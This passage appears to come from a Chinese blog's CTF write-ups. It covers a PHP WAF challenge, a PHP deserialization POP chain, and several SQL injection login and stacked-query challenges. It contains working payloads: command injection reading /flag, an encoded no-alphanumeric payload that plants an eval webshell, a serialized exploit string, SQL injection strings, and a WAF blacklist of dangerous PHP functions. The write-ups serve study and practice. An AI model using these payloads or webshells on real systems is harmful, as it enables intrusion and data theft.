1cmd=echo `ls /`;#查看根目录下发现存在/flag 1cmd=echo `cat /flag`;#尝试读取flag，结果没有回显，看起来flag被过滤了 1234cmd=echo `cat /f*`;cmd=echo `cat /fl'a'g`;cmd=echo `cat /f?ag`;#尝试上述两种绕过均可读取到flag 但是提交flag时发现是假的flag，果然不可能这么简单啊（悲 既然这样不妨看一看waf.php查看下防火墙规则吧（waf.php也被过滤了用w*绕过，网页直接读取文件没有分行实在难受，就用bp抓包后发传参了） waf.php内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202&lt;?phpsession_start();//config$sql_blacklist = &quot;/drop\\s*|dumpfile\\s*|INTO FILE\\s*|outfile\\s*|load_file\\s*|multipoint\\s*/i&quot;;$rce_blacklist = &quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\\s*\\(/i&quot;;$key_blacklist=&quot;/_GET|_POST|_COOKIE|_FILE|_SERVER|_SESSION|flag|waf/i&quot;;$config2333=[ &quot;cachestore&quot;=&gt;&quot;&quot;, &quot;flagFormat&quot;=&gt;&quot;ROIS&quot;,//=&gt; /ROIS{643124e14ecfc643124e14ecff}/i &quot;filterFunc&quot;=&gt;[ &quot;fileterOriginFlag&quot;, &quot;fileterBase64Flag&quot; ], &quot;filterInputRule&quot;=&gt;[ $sql_blacklist, $rce_blacklist, $key_blacklist ],//filter input &quot;fileFilter&quot;=&gt;true];//config endsif(!$config2333[&quot;cachestore&quot;]){ if(stripos(PHP_OS,&quot;WIN&quot;)===false){ //Linux $config2333[&quot;cachestore&quot;]=&quot;/tmp/cached&quot;; }else{ //Windows $config2333[&quot;cachestore&quot;]=&quot;cached&quot;; }}if(!is_dir($config2333[&quot;cachestore&quot;])){ mkdir($config2333[&quot;cachestore&quot;]); $config2333[&quot;cachestore&quot;] = realpath($config2333[&quot;cachestore&quot;]);}class CacheWaf{ public $config2333; public function __construct($config2333) { $this-&gt;config2333 = $config2333; //check cache exists $this-&gt;cacheExists(self::reqid()); //filter input foreach ($this-&gt;config2333[&quot;filterInputRule&quot;] as $black_list){ $_GET=filter_arr($black_list,$_GET); $_POST=filter_arr($black_list,$_POST); $_COOKIE=filter_arr($black_list,$_COOKIE); foreach ($_SERVER as $key =&gt;&amp;$value){ $value = strong_replace($black_list,&quot;&quot;,$value); } $_SESSION=filter_arr($black_list,$_SESSION); $_FILES=filter_arr($black_list,$_FILES); } //filter upload file if($this-&gt;config2333[&quot;fileFilter&quot;]){ foreach ($_FILES as $key =&gt; $value) { if(is_array($value[&quot;tmp_name&quot;])){ foreach ($value[&quot;tmp_name&quot;] as $k=&gt;$v){ $fileCon = file_get_contents($v); foreach ($this-&gt;config2333[&quot;filterInputRule&quot;] as $black_list){ $fileCon = strong_replace($black_list,&quot;&quot;,$fileCon); } file_put_contents($v,$fileCon); } }else{ $fileCon = file_get_contents($value[&quot;tmp_name&quot;]); foreach ($this-&gt;config2333[&quot;filterInputRule&quot;] as $black_list){ $fileCon = strong_replace($black_list,&quot;&quot;,$fileCon); } file_put_contents($value['tmp_name'],$fileCon); } } } //cache start ob_start(&quot;cacheCtrl&quot;); } public function __destruct() { @ob_end_flush(); } public function cacheExists($reqid){ $cacheFilePath=$this-&gt;config2333[&quot;cachestore&quot;].&quot;/&quot;.$reqid; if(file_exists($cacheFilePath)){ die(file_get_contents($cacheFilePath)); } } public static function reqid(){ $cookie = $_COOKIE; $get = $_GET; $requri=$_SERVER[&quot;SCRIPT_NAME&quot;]; $post = file_get_contents(&quot;php://input&quot;); $file = &quot;&quot;; foreach ($_FILES as $key =&gt; $value) { if(is_array($value[&quot;tmp_name&quot;])){ foreach ($value[&quot;tmp_name&quot;] as $k=&gt;$v){ $fileCon = file_get_contents($v); } }else{ $fileCon = file_get_contents($value[&quot;tmp_name&quot;]); } $file.=$fileCon; } sort($cookie); sort($get); $idcon=$requri.implode($cookie).implode($get).$post.$file; return md5($idcon); }}function fileterOriginFlag($buffer,$fakeflag,$flagFormat){ $buffer=preg_replace(&quot;/&quot;.$flagFormat.&quot;{.*}/im&quot;, $fakeflag,$buffer); return $buffer;}function fileterBase64Flag($buffer,$fakeflag,$flagFormat){ $base64flag = base64_encode($flagFormat); if(strrpos($base64flag,&quot;==&quot;)!==false){ $base64flag = substr($base64flag,0,-3); }elseif(strrpos($base64flag,&quot;=&quot;)!==false){ $base64flag = substr($base64flag,0,-2); } if(strpos($buffer,$base64flag)!==false){ $buffer=preg_replace(&quot;#$base64flag&quot;.&quot;[0-9a-zA-Z/+]+#&quot;, base64_encode($fakeflag),$buffer); } return $buffer;}function strong_replace ($rule,$replace,$str){ while(true){ $tmpstr = preg_replace($rule,$replace,$str); if($tmpstr === $str){ break; } $str = $tmpstr; } return $str;}function filter_arr($rule,$arr){ if($arr===null)return $arr; foreach ($arr as $key =&gt; $val){ //filter $key $tmpkey=strong_replace($rule,&quot;&quot;,$key); if(is_array($val)){ $tmpval = filter_arr($rule,$val); }else{ $tmpval = strong_replace($rule,&quot;&quot;,$val); } unset($arr[$key]); $arr[$tmpkey] = $tmpval; } return $arr;}function cacheCtrl($buffer) { //filter output chdir(dirname($_SERVER['SCRIPT_FILENAME'])); global $config2333; $uniqid = uniqid().uniqid(); $fakeflag = $config2333[&quot;flagFormat&quot;].&quot;{{$uniqid}}&quot;; $flagFormat = $config2333[&quot;flagFormat&quot;]; foreach ($config2333[&quot;filterFunc&quot;] as $filter){ $buffer = call_user_func($filter,$buffer,$fakeflag,$flagFormat); } //cahce $cacheFilePath=$config2333[&quot;cachestore&quot;].&quot;/&quot;.CacheWaf::reqid(); file_put_contents($cacheFilePath,$buffer); return $buffer;}global $cache23333;if($cache23333 === null){ $cache23333 = new CacheWaf($config2333);} 开幕雷击只能说是，一开头就被ban掉了一堆东西 123$sql_blacklist = &quot;/drop\\s*|dumpfile\\s*|INTO FILE\\s*|outfile\\s*|load_file\\s*|multipoint\\s*/i&quot;;$rce_blacklist = &quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\\s*\\(/i&quot;;#rce防火墙$key_blacklist=&quot;/_GET|_POST|_COOKIE|_FILE|_SERVER|_SESSION|flag|waf/i&quot;;#关键字防火墙,，&quot;flag&quot;、&quot;waf&quot;均被ban 定义了一个配置数组 1234567891011121314$config2333=[ &quot;cachestore&quot;=&gt;&quot;&quot;, &quot;flagFormat&quot;=&gt;&quot;ROIS&quot;,//=&gt; /ROIS{643124e14ecfc643124e14ecff}/i &quot;filterFunc&quot;=&gt;[ &quot;fileterOriginFlag&quot;, &quot;fileterBase64Flag&quot; ], &quot;filterInputRule&quot;=&gt;[ $sql_blacklist, $rce_blacklist, $key_blacklist ],//filter input &quot;fileFilter&quot;=&gt;true]; 看到了可疑内容filterFunc(过滤方法)和filterInputRule(过滤输入)，先看下filterFunc里的两个函数分别干啥的吧 12345function fileterOriginFlag($buffer,$fakeflag,$flagFormat){#line127 $buffer=preg_replace(&quot;/&quot;.$flagFormat.&quot;{.*}/im&quot;, $fakeflag,$buffer); return $buffer;} fileterOriginFlag(过滤原flag):传入$buffer、$fakeflag、$flagFormat，$flagFormat是”ROIS”。preg_replace()中的内容也就是把$buffer中ROIS{.*}形式的替换成假flag然后将返回的假flag赋值给$buffer，最终函数返回$buffer。 12345678910111213function fileterBase64Flag($buffer,$fakeflag,$flagFormat){#line133 $base64flag = base64_encode($flagFormat); if(strrpos($base64flag,&quot;==&quot;)!==false){ $base64flag = substr($base64flag,0,-3); }elseif(strrpos($base64flag,&quot;=&quot;)!==false){ $base64flag = substr($base64flag,0,-2); } if(strpos($buffer,$base64flag)!==false){ $buffer=preg_replace(&quot;#$base64flag&quot;.&quot;[0-9a-zA-Z/+]+#&quot;, base64_encode($fakeflag),$buffer); } return $buffer;} 其实和fileterOriginFlag()的作用差不多，但是多了一些截取base64编码中非”==”和”=”的部分的步骤。总体的意思也是将base64形式的flag替换成假的flag。 接下来看看这两个函数在waf中的位置，单独查函数名查不到，查filterFunc 12345678910function cacheCtrl($buffer) {#line180 //filter output chdir(dirname($_SERVER['SCRIPT_FILENAME']));#chdir()改变当前目录，dirname()返回绝对路径，$_SERVER['SCRIPT_FILENAME']为当前执行脚本的绝对路径。(https://www.php.net/manual/zh/reserved.variables.server.php) global $config2333; $uniqid = uniqid().uniqid();#uniqid()基于以微秒计的当前时间，生成一个唯一的 ID。 $fakeflag = $config2333[&quot;flagFormat&quot;].&quot;{{$uniqid}}&quot;; $flagFormat = $config2333[&quot;flagFormat&quot;]; foreach ($config2333[&quot;filterFunc&quot;] as $filter){ $buffer = call_user_func($filter,$buffer,$fakeflag,$flagFormat); }#依次执行那两个过滤函数 然后看下这个cacheCtrl()在waf中的作用 1ob_start(&quot;cacheCtrl&quot;);#line88 去学习了下php中的ob_start()： ob_start — 打开输出控制缓冲 ob_start(callable $callback)，内部缓冲区的内容可以用 ob_get_contents() 复制到字符串变量中。想要输出存储在内部缓冲区中的内容，使用 ob_end_flush() 函数。另外，使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。 12警告当有正在调用的回调函数时，一些 Web 服务器（例如 Apache）会改变脚本的工作目录。可以在回调函数中再把它改回来，例如 chdir(dirname($_SERVER['SCRIPT_FILENAME']))。#也就是line182 参数： $callback： 可选参数 callback 函数可以被指定。此函数把一个字符串当作参数并返回一个字符串。当输出缓冲区被（ob_flush()、ob_clean() 或者相似的函数）冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。当调用 callback 时，它将收到输出缓冲区的内容作为参数并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。如果这个 callback 不是一个可以调用的函数，此函数会返回 **false**。如果 callback 返回 false ，其原来的输入内容被直接送到浏览器。这个参数 callback 可以通过直接给一个 null 值而避开。 buffer： 输出缓冲区中的内容。 以下为用户自定义回调函数的例子： 123456789101112131415161718192021&lt;?phpfunction callback($buffer)#不理解上面ob_start(&quot;cacheCtrl&quot;)的可以结合这个看下，cacheCtrl的参数buffer和callback的参数buffer{ // replace all the apples with oranges return (str_replace(&quot;apples&quot;, &quot;oranges&quot;, $buffer));}ob_start(&quot;callback&quot;);?&gt;&lt;html&gt;&lt;body&gt;&lt;p&gt;It's like comparing apples to oranges.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpob_end_flush();?&gt; 会输出 12345&lt;html&gt;&lt;body&gt;&lt;p&gt;It's like comparing oranges to oranges.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; “当调用 callback 时，它将收到输出缓冲区的内容作为参数并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器” 也就是说，本题原本的$buffer为真正的flag，但是经过filterFunc的洗礼之后变成了fakeflag，调用cacheCtrl之后替换掉了原先位于缓冲区的真正的flag，将被送到浏览器。 ob_end_flush() - 冲刷出（送出）输出缓冲区内容并关闭缓冲区： 123public function __destruct() {#line92 @ob_end_flush();} 最终fakeflag从缓冲区被推向浏览器显示出来。 输出fakeflag的机制弄清楚了，根据fileterOriginFlag()的内容，原先buffer中的”ROIS{.*}”会被替换掉，那么只要我的输出中不包含这样的结构不就可以了吗。改变结构的想法无非就是编码、逆序。这里查看最上面的 1$rce_blacklist = &quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\\s*\\(/i&quot;; 发现base64编码被ban，逆序函数strrev()也被ban，md5()是没被ban但是总没有人敢手撕那坨玩意吧（ urlencode()没被ban，已知flag中包含”{}”，url编码之后大括号形式改变。 url解码得到真正的flag。bin2hex()函数也没被ban，能将结果变为16进制。 hex解码后得到真正的flag。 那么如果不从浏览器中显示，而是直接读取文件呢？这样一来就不会有通过浏览器将fakeflag显示出来了，即使缓冲区被修改了也不会通过浏览器被读取因为是直接读取文件。没错也就是上马实现rce后用蚁剑连接。 但是在层层的过滤之下怎么getshell呢？这时候就要有请无数字字母rce了 学习了这篇文章，用了大佬的无字母数字rce： 1(~(%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C))(~(%CB%D1%8F%97%8F),~(%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4)); 自己动手操作一遍： 12345678910111213141516&lt;?php$a=&quot;file_put_contents&quot;;$b=~$a;echo urlencode($b);echo &quot;\\n&quot;;$file=&quot;233.php&quot;;$c=~$file;echo urlencode($c);echo &quot;\\n&quot;;$content=&quot;&lt;?php eval(\\$_POST[1]);&quot;;$d=~$content;echo urlencode($d);#output:#%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C#%CD%CC%CC%D1%8F%97%8F#%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4 因此rce应为 1cmd=(~(%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C))(~(%CD%CC%CC%D1%8F%97%8F),~(%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4)); cmd传入： 发现已经写入当前目录了(如果没有写入说明当前目录对用户没开放写入权限，就要写入/tmp目录) 木马上完了，打开蚁剑，测试连接，连接成功。 读取根目录下的flag： 附： 缓冲(buffer)与缓存(cache)： 缓冲：为提高内存硬盘或其他I/O设备之间数据交换的效率而设计，当创建一个buffer对象时，会先创建一个缓冲区数组，然后我们读一个文件时，会先从硬盘中读到缓冲区，待缓冲区满了再进行传送（比如要使用echo输出，会将输出先存入缓存区中）。 缓存：为提高cpu和内存之间的数据交换效率而设计。当计算机执行程序时，数据与地址管理部件会 预测 可能要用到的数据和指令, 并将这些数据和指令预先从内存中读出送到Cache. 一旦需要时，先检查Cache，若有就从Cache中读取，若无再访问内存。 buffer侧重写，cache侧重读。 举例： buffer：倒垃圾不会一有垃圾就直接跑去垃圾站倒，而是先把垃圾扔垃圾桶里，等垃圾桶满了再去垃圾场倒。垃圾桶就是这个缓冲容器。 cache：缓存视频。 php中的输出流程： php输出语句/函数-&gt;php缓冲区配置-&gt;web服务器缓冲区配置-&gt;浏览器缓冲区-&gt;浏览器显示 php常用函数： 获取buffer中的内容：ob_get_contents()，使用案例： 1234567&lt;?phpob_start();echo 'hello world';$buffer = ob_get_contents();file_put_contents('log.txt',$buffer);?&gt;#浏览器中显示&quot;hello world&quot;，log.txt中写入&quot;hello world&quot; 清空buffer：ob_clean()，使用案例： 12345678&lt;?phpob_start();echo 'hello world';$buffer = ob_get_contents();file_put_contents('log.txt',$buffer);ob_clean();?&gt;#浏览器中不显示&quot;hello world&quot;，而log.txt储存了&quot;hello world&quot; ob_get_length() - 返回输出缓冲区的长度 ob_get_level() - 返回输出缓冲区的嵌套级别 ob_get_status() - 返回输出缓冲区的状态（数组形式返回，默认返回最顶层，参数为true时返回所有） ob_end_clean() - 清空（擦除）缓冲区并关闭输出缓冲 ob_get_flush() - 以字符串返回输出缓冲区内容并关闭缓冲 ob_end_flush() - 冲刷出（送出）输出缓冲区内容缓冲并关闭输出缓冲 php ob_start()中的一个小小思考： 1234567891011121314151617181920&lt;?php ob_start(); // start output buffer 1 echo &quot;a&quot;; // fill ob1 ob_start(); // start output buffer 2 echo &quot;b&quot;; // fill ob2 $s1 = ob_get_contents(); // read ob2 (&quot;b&quot;) ob_end_flush(); // flush ob2 to ob1 echo &quot;c&quot;; // continue filling ob1 $s2 = ob_get_contents(); // read ob1 (&quot;a&quot; . &quot;b&quot; . &quot;c&quot;) ob_end_flush(); // flush ob1 to browser // echoes &quot;b&quot; followed by &quot;abc&quot;, as supposed to: echo &quot;&lt;HR&gt;$s1&lt;HR&gt;$s2&lt;HR&gt;&quot;; ?&gt; #输出 3.php中系统命令执行函数： 函数 作用 使用 system() 执行系统命令，输出执行结果 system(“ls”) exec() 执行系统命令，不输出执行结果，返回执行结果数组 exec(‘ls’,$result) passthru() 执行系统命令，输出执行结果(支持二进制) passthru(“ls”) shell_exec() 执行系统命令，不输出结果，返回执行结果字符串 shell_exec(“ls”) popen 执行系统命令，不输出结果，返回一个资源类型 popen(“ls”,’r’) `` 执行系统命令，不输出结果，返回执行结果字符串 ls 4.无数字字母rce相关文章： ctfshow大挑战rce篇 Arsene.Tang的RCE篇之无数字字母rce Potat0w0的（ babyphp这题综合性比较强，考察了挺多方面的东西的（大哭 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?phperror_reporting(0);function backdoor(){ $a = $_GET[&quot;a&quot;]; $b = $_GET[&quot;b&quot;]; $d = $_GET[&quot;d&quot;]; $e = $_GET[&quot;e&quot;]; $f = $_GET[&quot;f&quot;]; $g = $_GET[&quot;g&quot;]; $class = new $a($b); $str1 = substr($class, $d, $e); $str2 = substr($class, $f, $g); $str1($str2);}class popko{ public $left; public $right;// public function __destruct() public function __call($method,$args) { if (($this-&gt;left != $this-&gt;right) &amp;&amp; (md5($this-&gt;left) === md5($this-&gt;right)) &amp;&amp; (sha1($this-&gt;left) === sha1($this-&gt;right))) { echo &quot;backdoor is here&quot;; backdoor(); } } public function __wakeup() { $this-&gt;left = &quot;&quot;; $this-&gt;right = &quot;&quot;; }}class pipimi{ function __destruct() { echo $this-&gt;a-&gt;a(); }}$c = $_GET[&quot;c&quot;];if ($c != null) { if (strstr($_GET[&quot;c&quot;], &quot;popko&quot;) === false) { unserialize($_GET[&quot;c&quot;]); } else { echo &quot;:)&quot;; }} else { highlight_file(__FILE__);} 开局直接一波代码审计。先看后端代码，是反序列化，很明显是希望执行backdoor()后门来进行rce，执行backdoor()方法就要执行popko类里的__call()方法，执行popko里的__call()方法就要调用一个未定义的方法，再往下看发现pipimi类中a类和a方法均未定义，pop链就比较明显了： 1pipimi::__destruct() =&gt; popko::__call() =&gt; backdoor() 再看__call()方法下的规则 1234if (($this-&gt;left != $this-&gt;right) &amp;&amp; (md5($this-&gt;left) === md5($this-&gt;right)) &amp;&amp; (sha1($this-&gt;left) === sha1($this-&gt;right))) { echo &quot;backdoor is here&quot;; backdoor(); } 要求popko类中的$left和$right不相同但是md5编码和sha1编码强比较相同，因此popko-&gt;left和popko-&gt;right均为数组 编写poc： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phperror_reporting(0);function backdoor(){ system(&quot;calc.exe&quot;);}class popko{ public $left; public $right;// public function __destruct() public function __call($method,$args) { backdoor(); } #public function __wakeup() #{ # $this-&gt;left = &quot;&quot;; # $this-&gt;right = &quot;&quot;; #}}class pipimi{ function __destruct() { echo $this-&gt;a-&gt;a(); }}$pop=new popko();$pop-&gt;left=[1];$pop-&gt;right=[2];$pip=new pipimi();$pip-&gt;a=$pop;echo serialize($pip); 漏洞存在，注意到popko类中的__wakeup()方法若执行会将left和right的值清空，_call()方法体的条件无法满足因此要绕过__wakeup()方法， 将生成的exp进行修改： 123O:6:&quot;pipimi&quot;:1:{s:1:&quot;a&quot;;O:5:&quot;popko&quot;:2:{s:4:&quot;left&quot;;a:1:{i:0;i:1;}s:5:&quot;right&quot;;a:1:{i:0;i:2;}}}//将popko的对象数2改为比2大的数O:6:&quot;pipimi&quot;:1:{s:1:&quot;a&quot;;O:5:&quot;popko&quot;:3:{s:4:&quot;left&quot;;a:1:{i:0;i:1;}s:5:&quot;right&quot;;a:1:{i:0;i:2;}}} 注意到函数主体部分有判断语句 123if (strstr($_GET[&quot;c&quot;], &quot;popko&quot;) === false) { unserialize($_GET[&quot;c&quot;]); } strrstr()函数区分大小写，但是php类不区分大小写，进行大写绕过 1O:6:&quot;pipimi&quot;:1:{s:1:&quot;a&quot;;O:5:&quot;Popko&quot;:3:{s:4:&quot;left&quot;;a:1:{i:0;i:1;}s:5:&quot;right&quot;;a:1:{i:0;i:2;}}} GET传入c 进入后门后查看backdoor()函数体： 12345678910111213function backdoor(){ $a = $_GET[&quot;a&quot;]; $b = $_GET[&quot;b&quot;]; $d = $_GET[&quot;d&quot;]; $e = $_GET[&quot;e&quot;]; $f = $_GET[&quot;f&quot;]; $g = $_GET[&quot;g&quot;]; $class = new $a($b); $str1 = substr($class, $d, $e); $str2 = substr($class, $f, $g); $str1($str2);} $a是一个类，向类$a中传入参数$b返回值赋值给$class。但是并未定义这样一个满足条件的类，这时候就要去学习php原生类的知识了。查找到原生类ERROR。 可以看到返回值前面几个字符为 1Error: 12345#注意引号和字符串&quot;12345&quot;之间有个空格 目的就很明确了，$a为ERROR原生类，$b为一个由命令执行函数和执行的命令组成的字符串。$d和$e代表命令执行函数在ERROR返回值中的首位置和命令执行函数的长度，$f和$g代表所执行的命令在ERROR返回值中的首位置和长度进行截取。 1234567$a = &quot;ERROR&quot;;$b = &quot;systemls&quot;#此时error返回Error: systemls，其中s位于第七个位置，&quot;system&quot;长度6，同理，l位于13，&quot;ls&quot;长度2，则$d = 7;$e = 6;$f = 13;$g = 2; GET传入a、b、d、e、f、g对应的值。 命令执行成功了。 对b、d、e、f、g进行修改，发现根目录下存在flag。 最终payload： 1?c=O:6:&quot;pipimi&quot;:1:{s:1:&quot;a&quot;;O:5:&quot;Popko&quot;:3:{s:4:&quot;left&quot;;a:1:{i:0;i:1;}s:5:&quot;right&quot;;a:1:{i:0;i:2;}}}&amp;a=Error&amp;b=systemcat /flag&amp;d=7&amp;e=6&amp;f=13&amp;g=9","link":"/2023/02/10/ROIS/"},{"title":"SQLI","text":"SQLICTF After Dark-Injection Perfection因为想起来要把这道题收进来的时候网站已经关闭了（悲，所以没法复现题目环境，题目的页面就是一般的登录页面，用户名，密码，提交，题目要求使用admin账户登录。还好赛题部分源码还能下载。这是app.js内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667const express = require('express');const path = require('path');const multer = require('multer');const bodyParser = require('body-parser');const port = parseInt(process.env.PORT) || 8080;const sqlite3 = require('sqlite3');const db = new sqlite3.Database('app.db', sqlite3.OPEN_READONLY);const app = express();const upload = multer();app.use(bodyParser.urlencoded({ extended: true }));app.use(upload.array());app.use(express.static('public'));const getFavColor = async (username) =&gt; { return new Promise((resolve, reject) =&gt; { db.get('SELECT fav_color FROM users WHERE username=?', username, (err, row) =&gt; { if (err) return resolve(err); return resolve(row.fav_color); }); });};const attemptLogin = (username, password) =&gt; { return new Promise((resolve, reject) =&gt; { db.get(`SELECT username, password FROM users WHERE username='${username}'`, async (err, row) =&gt; { if (err) return reject(err); else if (row === undefined) return reject('Invalid User'); else if (password === row.password) return resolve(`My favorite color is ${await getFavColor(row.username)}`); else return reject('incorrect password'); }); })};app.get('/', (req, res) =&gt; { res.sendFile(path.join(__dirname, 'login.html'));});app.post('/', async (req, res) =&gt; { const username = req.body.username; const password = req.body.password; if (!username || !password) return res.status(400).send(&quot;Invalid Login&quot;); try { return res.status(200).send(await attemptLogin(username, password)); } catch (err) { return res.status(400).send(err); }});app.get('*', (req, res) =&gt; { res.status(404).send('not found');});app.listen(port, () =&gt; { console.log(`Listening on port ${port}`);}); 本题重点在第29行这个回调函数，从数据库调数据与用户输入进行比对，那就看看这个后端判断登录的逻辑是什么样的吧： 12345678910db.get(`SELECT username, password FROM users WHERE username='${username}'`, async (err, row) =&gt; { if (err) return reject(err); else if (row === undefined) return reject('Invalid User'); else if (password === row.password) return resolve(`My favorite color is ${await getFavColor(row.username)}`); else return reject('incorrect password'); }); 显然如果存在sql注入的话username将会是注入点，可以看出逻辑为： 从数据库的users表查名为用户输入的username的行中的username和password字段，将结果存入row数组中，如果用户输入的password等于数据库查到的row.password，也就是登陆成功，则执行一个getFavColor()方法 getFavColor(): 12345678const getFavColor = async (username) =&gt; { return new Promise((resolve, reject) =&gt; { db.get('SELECT fav_color FROM users WHERE username=?', username, (err, row) =&gt; { if (err) return resolve(err); return resolve(row.fav_color); }); });}; 大概users里存着三个字段：username、password、fav_color。getColor()方法是当用户登陆成功后查询登录账户最喜欢的颜色并返回，题目要求使用admin登录，盲猜admin最喜欢的颜色就是flag啦（。 再回到登录验证部分。那么怎么样才能输入用户名”admin”，然后输入密码对应的是”admin”对应的密码呢？一开始陷入了这个思维陷阱没跳出来，实际上，可以这样： 12username:*' UNION SELECT &quot;admin&quot;,&quot;123&quot;--+password:123 用户名中的”*”指的是一个数据库中不存在的用户名，空着也行，然后单引号闭合。SELECT “admin” 和 “123”，最后”–+”闭合语句，这样一来整个sql语句的查询结果就变成了 username password admin 123 那么当用户输入密码为”123”自然就等于row.password了，登陆成功。 为便于理解，我们本地创建一个表user_info，表如下： 本地测试结果如下： 表中不存在”21112”的用户，因此此处无查询结果，联合查询利用select直接返回字符串。如果username填入已有用户，查询结果如下： 当然，要学会善于利用工具（，话不多说，上图 这道题用sqlmap也能直接淦出来。厚礼蟹 BUUCTF-EasySql先用用户名:1 密码:1’ 测试注入，页面报错，可能存在注入点，并且是字符型。 密码传入***1’ order by 4 #***时报错，判断出数据库有三个字段。 准备爆数据库名，二分法传入***1’ or (ascii(substr(database(),0,1))&lt;128)#***，结果直接拿到了flag。 题后反思：因为传入***1’ or (ascii(substr(database(),0,1))&lt;128)#*导致后端查询语句变成select * from 数据库名 where username = ‘1’ and pasword =’1’ or (ascii(substr(database(),0,1))&lt;128)#’***因为and优先级高于or，于是整个句子变成了两个部分： select * from 数据库名 where username = ‘1’ and pasword =’1’ 和 or (ascii(substr(database(),0,1))&lt;128)#’ 虽然用户名密码判断是错的，但是数据库名的第一个字符的ascii码确实小于128，为真，二者用or相连，返回为true，故登陆成功获取到flag； 但是这样做实际上是走弯路了，这道题布尔盲注不是最优解，实际上直接构造密码为***1’ or 1=1#***在原理上是和上面误打误撞拿到flag是一样的，但是少走了很多弯路。 BUUCTF-easy_sql先传入1，返回一个字符串，传入1’，报错 可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。 传入***’ order by 3#，报错。传入‘ order by 2#***不报错，判断表里有2个字段。 联合查询尝试失败，select被ban。尝试构造无字母数字的语句。编写脚本 123456789101112&lt;?php$var = 's';//依次将s改为e,l,e,c,t for($i=0;$i&lt;256;$i++){ for($j=0;$j&lt;256;$j++){ if(chr($i^$j)==$var){ echo (urlencode(chr($i)).&quot;^&quot;.urlencode(chr($j))); echo &quot;\\n&quot;; } } } ?&gt; 得到select，尝试能否绕过 1('%5D'^'.').('H'^'-').('%5D'^'1').('H'^'-').('_'^'%3C').('_'^'%2B') 还是没绕过，暂时放弃这条路。 查找学习show databases爆数据库名。 show tables爆表名，好臭的表名啊(。 ‘; show columns from 1919810931114514;#爆字段名（表名要用反引号引起来，typora里不知道为什么吞反引号） 万事俱备，只欠select，直接select不行，去查找能代替select的，果不其然，找到了handler语句。 1handler [表名] open;#打开表（句柄） 12handler [表名] read first;#从表的第一列开始读（指针的起点）handler [表名] read next;#指针往后一位，读取数据（参考资料https://blog.csdn.net/JesseYoung/article/details/40785137） 最终构造payload： 1';handler `1919810931114514` open;handler `1919810931114514` read first;# 拿到flag。 反思：除了上面的方法寻找mysql中的其他查询语句外，看了大佬们的wp后学到了更多的思路和相关知识，这道题还可以通过预编译得到flag。 预编译相关语法： 123set : #设置变量；prepare : #准备一个语句赋予其名称，之后直接调用语句；execute :#执行语句； 以及一个mysql语句concat(str1,str2)，将str1与str2连接起来返回连接后的字符串；或者mysql的hex()函数把语句变成十六进制同样可以绕过select的过滤。 步骤如下： 1set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);#创建一个变量@abc为字符串&quot;select * from `1919810931114514`&quot; 1prepare sel from @abc;#预备一个语句sel，内容是@abc，也就是&quot;select * from `1919810931114514`&quot; 1execute sel;#执行sel语句； 构造 1';set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel; 然后提示set被ban了，但是用的是strstr()，区分大小写，所以大写绕过 1';Set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel; 十六进制绕过的步骤如下： 打开mysql命令行输入 1select hex(&quot;select * from `191981096114514`&quot;); 得到一串十六进制字符串。 构造预处理语句： 1set @abc=73656C656374202A2066726F6D206031393139383130393631313435313460;prepare sel from @abc;execute sel; set同样大写绕过，payload： 121';Set @abc=0x73656C656374202A2066726F6D20603139313938313039333131313435313460;Prepare sel from @abc;execute 